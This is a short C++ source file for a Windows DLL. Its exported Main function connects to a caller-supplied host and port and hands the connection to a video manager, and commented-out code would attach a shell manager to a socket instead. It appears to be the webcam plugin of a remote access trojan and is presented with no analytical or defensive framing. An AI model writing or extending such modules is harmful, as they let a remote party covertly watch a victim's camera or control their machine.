// DllTest.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "VideoManager.h"
#include "../Dllcomment/ClientSocket.h"



// BOOL APIENTRY DllMain( HANDLE hModule, 
//                        DWORD  ul_reason_for_call, 
//                        LPVOID lpReserved
// 					 )
// {
//     return TRUE;
// }

extern "C" __declspec(dllexport) bool Main(LPCTSTR lpszHost, UINT nPort,LPBYTE blparam)

{

//	MyMsg("adiostart");

	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;
	
	CVideoManager	manager(&socketClient);
	
	socketClient.run_event_loop();
	
	return 0;
}

extern "C" __declspec(dllexport) char * Version()//SOCKET sRemote)
{
// 	MessageBox(NULL,"xxx","yyyy",0);
// 	CClientSocket	socketClient;
// 	if (!socketClient.Connect("127.0.0.1", 80))
// 		return -1;
// 	
// 	CShellManager	manager(&socketClient);
// 	
// 	socketClient.run_event_loop();
	
	return "Video1017";
}
